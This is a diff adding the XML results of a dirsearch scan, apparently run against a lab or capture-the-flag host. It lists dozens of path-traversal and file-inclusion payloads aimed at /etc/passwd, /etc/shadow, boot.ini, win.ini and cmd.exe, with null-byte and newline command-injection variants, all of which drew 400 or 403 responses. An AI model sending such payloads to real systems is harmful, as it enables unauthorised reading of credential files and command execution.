@@ -1,0 +1,483 @@
+<?xml version="1.0" ?>
+<dirsearchscan args="/usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u 10.10.11.250 -w /home/kali/Downloads/file_inclusion_windows.txt --format=xml -o dir.xml" time="Sun Jan 21 18:06:51 2024">
+	<target url="http://10.10.11.250/%00../../../../../../etc/shadow">
+		<status>400</status>
+		<contentLength>324</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%0a/bin/cat%20/etc/shadow">
+		<status>400</status>
+		<contentLength>324</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00">
+		<status>400</status>
+		<contentLength>324</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%00/etc/passwd%00">
+		<status>400</status>
+		<contentLength>324</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%00../../../../../../etc/passwd">
+		<status>400</status>
+		<contentLength>324</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%0a/bin/cat%20/etc/passwd">
+		<status>400</status>
+		<contentLength>324</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%00/etc/shadow%00">
+		<status>400</status>
+		<contentLength>324</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%2e%2e%2f%2e%68%74%61%63%63%65%73%73">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../etc/passwd">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../../../../../localstart.asp">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../../../../../boot.ini">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../conf/server.xml">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/..\..\..\..\..\..\..\..\..\..\boot.ini%00">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../boot.ini">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../../../../../etc/hosts%00">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../etc/passwd">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../../../../../etc/passwd">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../etc/passwd">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../../../../../etc/hosts">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../etc/passwd">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../etc/passwd">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../../../../../etc/passwd%00">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../../../../../boot.ini%00">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../../../../../etc/shadow">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../../etc/passwd">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../../../../../etc/shadow%00">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../../../../../localstart.asp%00">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../etc/passwd">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/..\..\..\..\..\..\..\..\..\..\boot.ini">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/..\..\..\..\..\..\..\..\..\..\etc\passwd">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/..\..\..\..\..\..\..\..\..\..\etc\passwd%00">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../../../../etc/passwd%00.jpg">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../../../../boot.ini%00">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../../../etc/passwd">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/..\..\..\..\..\..\..\..\..\..\etc\shadow">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../../../../etc/passwd%00.html">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/..\..\..\..\..\..\..\..\..\..\etc\shadow%00">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../../../../boot.ini%00.html">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../%2A">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../../../../boot.ini%00.jpg">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../../../etc/passwd^^">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../../../etc/shadow">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../../../../boot.ini">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../../../etc/shadow^^">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/..\../..\../..\../..\../..\../..\../boot.ini">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/../../../../../../../../bin/id|">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/..\../..\../..\../..\../..\../..\../etc/shadow">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/..\../..\../..\../..\../..\../..\../etc/passwd">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/\..\..\..\WINDOWS\win.ini">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/\..\..\..\..\..\..\..\..\..\..\etc\shadow%00">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/\..\..\..\..\..\..\WINDOWS\win.ini">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/\..\..\..\..\..\..\..\..\..\..\etc\passwd%00">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/\..\..\..\..\..\..\..\..\..\..\etc\passwd">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/\..\..\..\..\..\WINDOWS\win.ini">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/\..\WINDOWS\win.ini">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/\..\..\..\..\..\..\..\..\..\..\etc\shadow">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/\..\..\..\..\WINDOWS\win.ini">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/\..\..\..\..\..\..\..\..\..\..\boot.ini">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+	<target url="http://10.10.11.250/\..\..\WINDOWS\win.ini">
+		<status>403</status>
+		<contentLength>312</contentLength>
+		<contentType>text/html</contentType>
+	</target>
+</dirsearchscan>
